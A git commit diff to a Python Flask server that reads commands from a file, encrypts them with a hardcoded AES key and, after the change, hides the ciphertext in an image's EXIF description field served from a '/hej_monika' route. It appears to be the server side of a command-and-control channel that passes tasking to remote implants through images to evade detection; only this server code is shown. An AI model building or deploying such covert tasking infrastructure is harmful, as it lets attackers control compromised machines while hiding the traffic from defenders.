125147402938bef549d1c200960fed1a09ae85a7
CeilingGang <135511303+CeilingGang@users.noreply.github.com>
2023-06-05 15:10:30 +0200

    MARZIA CHECK YOUR WHATSAPP

--- server.py
+++ server.py
@@ -1,15 +1,24 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file
 from werkzeug.wrappers import Request
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from base64 import b64encode, b64decode
-import os
+import piexif
+from PIL import Image
 
 app = Flask(__name__)
 
 # Pre-shared Key for AES Encryption
 key_hex_str = '966b926de08c6c0bfd3811809cba8da1'
 key = bytes.fromhex(key_hex_str)
+
+
+def let_me_serve_you_bitch_lasagna(data, image_path='./image.png'):
+    img = Image.open("./image.png")
+    exif_dict = piexif.load(img.info["exif"])
+    exif_dict["0th"][piexif.ImageIFD.ImageDescription] = data.encode()
+    exif_bytes = piexif.dump(exif_dict)
+    img.save(image_path, "jpeg", exif=exif_bytes)
 
 
 @app.route('/hej_monika', methods=['GET'])
@@ -27,8 +36,12 @@ def get_command():
             # Encrypt the content before sending
             cipher = AES.new(key, AES.MODE_CBC)
             ct_bytes = cipher.encrypt(pad(content.encode(), AES.block_size))
-            output = b64encode(cipher.iv + ct_bytes).decode('utf-8')
-            return jsonify({'commands': output})
+            data = b64encode(cipher.iv + ct_bytes).decode('utf-8')
+
+            let_me_serve_you_bitch_lasagna(data)
+
+            return send_file('./image.png', mimetype='image/png')
+
     except FileNotFoundError:
         return 'commands.txt file does not exist', 404
 
